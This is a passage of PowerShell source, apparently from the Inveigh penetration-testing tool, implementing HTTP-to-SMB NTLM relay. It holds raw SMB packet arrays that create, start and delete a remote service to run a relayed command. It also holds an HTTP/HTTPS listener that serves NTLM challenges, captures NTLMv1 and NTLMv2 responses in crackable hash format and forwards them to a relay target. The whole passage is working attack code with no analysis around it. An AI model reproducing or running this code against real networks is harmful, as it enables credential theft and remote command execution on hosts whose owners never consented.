                    $SMB_relay_execute_send = 0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                $inveigh.process_ID_bytes +
                                                $SMB_user_ID +
                                                0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
                                                0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00,0x00,0x00,0x48,0x00,0x3f,
                                                0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,
                                                0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,
                                                0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
                                                0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,
                                                0x00,0x10,0x03,0x02,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,
                                                0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,
                                                0x00
                        
                    $SMB_multiplex_id = 0x05
                }
               
                3
                { 
                    $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                4
                {
                    $SMB_relay_execute_send = 0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                $inveigh.process_ID_bytes +
                                                $SMB_user_ID +
                                                0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
                                                0xff,0xff,0xff,0xff,0x08,0x00,0x50,0x00,0x00,0x00,0x5c,0x00,0x3f,
                                                0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                                0x00,0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,
                                                0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03,0x00,0x15,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                                $SMB_service_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00
                        
                    $SMB_multiplex_id = 0x07
                }
                
                5
                {  
                    $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                6
                {
                    $SMB_relay_execute_send = [Array]0x00 +
                                                $SMB_service_data_length_bytes +
                                                0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08 +
                                                $inveigh.process_ID_bytes +
                                                $SMB_user_ID +
                                                0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
                                                0xff,0xff,0xff,0xff,0x08,0x00 +
                                                $SMB_service_byte_count_bytes +
                                                0x00,0x00 +
                                                $SMB_service_byte_count_bytes +
                                                0x3f,0x00,0x00,0x00,0x00,0x00 +
                                                $SMB_service_byte_count_bytes +
                                                0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00 +
                                                $SMB_service_byte_count_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,
                                                0x00 +
                                                $SMB_context_handler +
                                                0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                                $SMB_service_bytes +
                                                0x00,0x00 +
                                                $SMB_referent_ID_bytes +
                                                0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                                $SMB_service_bytes +
                                                0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00 +
                                                $SMB_relay_command_length_bytes +
                                                0x00,0x00,0x00,0x00 +
                                                $SMB_relay_command_length_bytes +
                                                $SMB_relay_command_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00
                        
                    $SMB_multiplex_id = 0x09
                }

                7
                {
                    $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }

                
                8
                {
                    $SMB_relay_execute_send = 0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                $inveigh.process_ID_bytes +
                                                $SMB_user_ID +
                                                0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
                                                0xff,0xff,0xff,0xff,0x08,0x00,0x34,0x00,0x00,0x00,0x34,0x00,0x3f,
                                                0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                                0x00,0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,
                                                0x00,0x00,0x00,0x13,0x00 +
                                                $SMB_context_handler +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                }
                
                9
                {
                    $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                10
                { 
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                $inveigh.process_ID_bytes +
                                                $SMB_user_ID +
                                                0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,
                                                0xff,0xff,0xff,0xff,0x08,0x00,0x2c,0x00,0x00,0x00,0x2c,0x00,0x3f,
                                                0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                                0x00,0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,
                                                0x00,0x00,0x00,0x02,0x00 +
                                                $SMB_context_handler
                }

                11
                {
                     $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }

            }
            
            $SMB_relay_execute_stream.Write($SMB_relay_execute_send,0,$SMB_relay_execute_send.Length)
            $SMB_relay_execute_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_execute_timeout = New-TimeSpan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_execute_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                
                while(!$SMB_relay_execute_stream.DataAvailable)
                {

                    if($SMB_relay_execute_stopwatch.Elapsed -ge $SMB_relay_execute_timeout)
                    {
                        $inveigh.console_queue.Add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $SMB_relay_failed = $true
                        break SMB_relay_execute_loop
                    }
                
                }
            
            }
            
            if ($k -eq 5) 
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes,0,$SMB_relay_execute_bytes.Length)
                $SMB_context_handler = $SMB_relay_execute_bytes[88..107]

                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_context_handler) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                {
                    $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")])
                }
                elseif([System.BitConverter]::ToString($SMB_relay_execute_bytes[108..111]) -eq '05-00-00-00')
                {
                    $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")])
                    $inveigh.SMBRelay_failed_list.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget")
                    $SMB_relay_failed = $true
                }
                else
                {
                    $SMB_relay_failed = $true
                }

            }
            elseif (($k -eq 7) -or ($k -eq 9) -or ($k -eq 11))
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes,0,$SMB_relay_execute_bytes.Length)

                switch($k)
                {

                    7
                    {
                        $SMB_context_handler = $SMB_relay_execute_bytes[92..111]
                        $SMB_relay_execute_error_message = "Service creation fault context mismatch"
                    }

                    11
                    {
                        $SMB_relay_execute_error_message = "Service start fault context mismatch"
                    }

                    13
                    {
                        $SMB_relay_execute_error_message = "Service deletion fault context mismatch"
                    }

                }
                
                if([System.BitConverter]::ToString($SMB_context_handler[0..3]) -ne '00-00-00-00')
                {
                    $SMB_relay_failed = $true
                }

                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq '1a-00-00-1c')
                {
                    $inveigh.console_queue.Add("$SMB_relay_execute_error_message service on $SMBRelayTarget")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $SMB_relay_execute_error on $SMBRelayTarget")])
                    $SMB_relay_failed = $true
                }

            }        
            else
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes,0,$SMB_relay_execute_bytes.Length)    
            }
            
            if(!$SMB_relay_failed -and $k -eq 7)
            {
                $inveigh.console_queue.Add("SMB relay service $SMB_service created on $SMBRelayTarget")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $SMBRelayTarget")])
            }
            elseif((!$SMB_relay_failed) -and ($k -eq 9))
            {
                $inveigh.console_queue.Add("SMB relay command likely executed on $SMBRelayTarget")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay command likely executed on $SMBRelayTarget")])
            
                if($SMBRelayAutoDisable -eq 'Y')
                {
                    $inveigh.SMB_relay = $false
                    $inveigh.console_queue.Add("SMB relay auto disabled due to success")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay auto disabled due to success")])
                }

            }
            elseif(!$SMB_relay_failed -and $k -eq 11)
            {
                $inveigh.console_queue.Add("SMB relay service $SMB_service deleted on $SMBRelayTarget")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $SMBRelayTarget")])
            }   
            
            $SMB_relay_execute_ReadAndRequest = 0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,
                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                $inveigh.process_ID_bytes +
                                                $SMB_user_ID +
                                                $SMB_multiplex_ID +
                                                0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,
                                                0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00
            
            if($SMB_relay_failed)
            {
                $inveigh.console_queue.Add("SMB relay failed on $SMBRelayTarget")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay failed on $SMBRelayTarget")])
                BREAK SMB_relay_execute_loop
            }

            $k++
        }
        
        $inveigh.SMB_relay_active_step = 0
        $SMB_relay_socket.Close()
    }

}

# HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
$HTTP_scriptblock = 
{ 
    param ($Challenge,$SMBRelayTarget,$SMBRelayCommand,$SMBRelayUsernames,$SMBRelayAutoDisable,$SMBRelayNetworkTimeout,$WPADAuth)

    function NTLMChallengeBase64
    {
        param ([String]$Challenge)

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($Challenge)
        {
            $HTTP_challenge = $Challenge
            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object{"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ',''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge)  > $null

        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                            0x00,0x00,0x00,0x05,0x82,0x89,0xa2 +
                            $HTTP_challenge_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                            $HTTP_timestamp +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = 'NTLM ' + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge

        return $NTLM

    }
    
    while ($inveigh.relay_running)
    {
        $inveigh.context = $inveigh.HTTP_listener.GetContext() 
        $inveigh.request = $inveigh.context.Request
        $inveigh.response = $inveigh.context.Response
        $inveigh.message = ''    
        $NTLM = 'NTLM'
        
        if($inveigh.request.IsSecureConnection)
        {
            $HTTP_type = "HTTPS"
        }
        else
        {
            $HTTP_type = "HTTP"
        }
        
        if ($inveigh.request.RawUrl -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous')
        {
            $inveigh.response.StatusCode = 200
        }
        else
        {
            $inveigh.response.StatusCode = 401
        }

        $HTTP_request_time = Get-Date -format 's'

        if($HTTP_request_time -eq $HTTP_request_time_old -and $inveigh.request.RawUrl -eq $HTTP_request_raw_url_old -and $inveigh.request.RemoteEndpoint.Address -eq $HTTP_request_remote_endpoint_old)
        {
            $HTTP_raw_url_output = $false
        }
        else
        {
            $HTTP_raw_url_output = $true
        }

        if(!$inveigh.request.headers["Authorization"] -and $inveigh.HTTP_listener.IsListening -and $HTTP_raw_url_output)
        {
            $inveigh.console_queue.Add("$HTTP_request_time - $HTTP_type request for " + $inveigh.request.RawUrl + " received from " + $inveigh.request.RemoteEndpoint.Address)
            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$HTTP_request_time - $HTTP_type request for " + $inveigh.request.RawUrl + " received from " + $inveigh.request.RemoteEndpoint.Address)])
        }

        $HTTP_request_raw_url_old = $inveigh.request.RawUrl
        $HTTP_request_remote_endpoint_old = $inveigh.request.RemoteEndpoint.Address
        $HTTP_request_time_old = $HTTP_request_time
            
        [String] $authentication_header = $inveigh.request.headers.getvalues('Authorization')
        
        if($authentication_header.startswith('NTLM '))
        {
            $authentication_header = $authentication_header -replace 'NTLM ',''
            [Byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
            $inveigh.response.StatusCode = 401
            
            if ($HTTP_request_bytes[8] -eq 1)
            {

                if($inveigh.SMB_relay -and $inveigh.SMB_relay_active_step -eq 0 -and $inveigh.request.RemoteEndpoint.Address -ne $SMBRelayTarget)
                {
                    $inveigh.SMB_relay_active_step = 1
                    $inveigh.console_queue.Add("$HTTP_type to SMB relay triggered by " + $inveigh.request.RemoteEndpoint.Address + " at $(Get-Date -format 's')")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by " + $inveigh.request.RemoteEndpoint.Address)])
                    $inveigh.console_queue.Add("Grabbing challenge for relay from $SMBRelayTarget")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $SMBRelayTarget)])
                    $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                    $SMB_relay_socket.Connect($SMBRelayTarget,"445")
                    
                    if(!$SMB_relay_socket.connected)
                    {
                        $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB relay target is not responding")
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay target is not responding")])
                        $inveigh.SMB_relay_active_step = 0
                    }
                    
                    if($inveigh.SMB_relay_active_step -eq 1)
                    {
                        $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes
                        $inveigh.SMB_relay_active_step = 2
                        $SMB_relay_bytes = $SMB_relay_bytes[2..$SMB_relay_bytes.Length]
                        $SMB_user_ID = $SMB_relay_bytes[34..33]
                        $SMB_relay_NTLMSSP = [System.BitConverter]::ToString($SMB_relay_bytes)
                        $SMB_relay_NTLMSSP = $SMB_relay_NTLMSSP -replace "-",""
                        $SMB_relay_NTLMSSP_index = $SMB_relay_NTLMSSP.IndexOf("4E544C4D53535000")
                        $SMB_relay_NTLMSSP_bytes_index = $SMB_relay_NTLMSSP_index / 2
                        $SMB_domain_length = DataLength2 ($SMB_relay_NTLMSSP_bytes_index + 12) $SMB_relay_bytes
                        $SMB_domain_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 12)..($SMB_relay_NTLMSSP_bytes_index + 19)]
                        $SMB_target_length = DataLength2 ($SMB_relay_NTLMSSP_bytes_index + 40) $SMB_relay_bytes
                        $SMB_target_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 40)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length)]
                        $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]
                        $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
                    
                        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                           $SMB_domain_length_offset_bytes +
                                           0x05,0x82,0x89,0xa2 +
                                           $SMB_relay_NTLM_challenge +
                                           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                           $SMB_target_length_offset_bytes +
                                           $SMB_relay_target_details
                    
                        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                        $NTLM = 'NTLM ' + $NTLM_challenge_base64
                        $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
                        $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $NTLM_challenge)
                        $inveigh.console_queue.Add("Received challenge $NTLM_challenge for relay from $SMBRelayTarget")
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $SMBRelayTarget")])
                        $inveigh.console_queue.Add("Providing challenge $NTLM_challenge for relay to " + $inveigh.request.RemoteEndpoint.Address)
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to " + $inveigh.request.RemoteEndpoint.Address)])
                        $inveigh.SMB_relay_active_step = 3
                    }
                    else
                    {
                        $NTLM = NTLMChallengeBase64 $Challenge
                    }

                }
                else
                {
                     $NTLM = NTLMChallengeBase64 $Challenge
                }
                
                $inveigh.response.StatusCode = 401
            }
            elseif ($HTTP_request_bytes[8] -eq 3)
            {
                $NTLM = 'NTLM'
                $HTTP_NTLM_length = DataLength2 20 $HTTP_request_bytes
                $HTTP_NTLM_offset = DataLength4 24 $HTTP_request_bytes
                $HTTP_NTLM_domain_length = DataLength2 28 $HTTP_request_bytes
                $HTTP_NTLM_domain_offset = DataLength4 32 $HTTP_request_bytes
                [String] $NTLM_challenge = $inveigh.HTTP_challenge_queue -like $inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + '*'
                $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(",")) + 1)
                       
                if($HTTP_NTLM_domain_length -eq 0)
                {
                    $HTTP_NTLM_domain_string = ''
                }
                else
                {  
                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes
                } 
                    
                $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
                $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
                $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
                $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes
        
                if($HTTP_NTLM_length -eq 24) # NTLMv1
                {
                    $NTLM_type = "NTLMv1"
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(48,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                    
                    if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                    {    
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv1_file_queue.Add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv1_list.Add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.Add("$HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                        }

                    }
                    
                    if($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address -and -not $HTTP_NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat)
                    {
                        $inveigh.IP_capture_list.Add($source_IP.IPAddressToString)
                    }

                }
                else # NTLMv2
                {   
                    $NTLM_type = "NTLMv2"           
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(32,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                    
                    if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                    {
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv2_file_queue.Add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv2_list.Add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.Add("$HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                        }
                        
                    }
                    
                    if ($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address -and -not $HTTP_NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat)
                    {
                        $inveigh.IP_capture_list += $inveigh.request.RemoteEndpoint.Address
                    }

                }
                
                $inveigh.response.StatusCode = 200
                $NTLM_challenge = ''
                $HTTP_raw_url_output = $true
                
                if ($inveigh.SMB_relay -and $inveigh.SMB_relay_active_step -eq 3)
                {

                    if(!$SMBRelayUsernames -or $SMBRelayUsernames -contains $HTTP_NTLM_user_string -or $SMBRelayUsernames -contains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                    {

                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$')))
                        {

                            if($inveigh.SMBRelay_failed_list -notcontains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget")
                            {

                                if($NTLM_type -eq 'NTLMv2')
                                {
                                    $inveigh.console_queue.Add("Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
                                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")])
                                    $SMB_relay_response_return_bytes = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_user_ID
                                    $SMB_relay_response_return_bytes = $SMB_relay_response_return_bytes[1..$SMB_relay_response_return_bytes.Length]
                    
                                    if(!$SMB_relay_failed -and [System.BitConverter]::ToString($SMB_relay_response_return_bytes[9..12]) -eq '00-00-00-00')
                                    {
                                        $inveigh.console_queue.Add("$HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")])
                                        $inveigh.SMB_relay_active_step = 4
                                        SMBRelayExecute $SMB_relay_socket $SMB_user_ID          
                                    }
                                    else
                                    {
                                        $inveigh.console_queue.Add("$HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
